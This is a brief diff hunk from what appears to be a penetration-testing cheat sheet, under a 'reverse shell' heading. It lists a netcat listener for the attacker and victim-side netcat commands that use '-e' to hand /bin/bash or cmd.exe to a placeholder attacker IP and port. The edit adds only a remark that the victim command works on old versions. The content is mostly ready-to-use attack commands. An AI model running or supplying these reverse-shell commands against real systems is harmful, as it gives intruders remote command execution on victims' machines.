@@ -21,7 +21,7 @@ reverse shell
 =============
 attacker
 	nc -nvlp <port>
-victim
+victim : only on old version
 	nc -nv <attacker ip> <attacker port> -e /bin/bash
 	nc -nv <attacker ip> <attacker port> -e cmd.exe
 
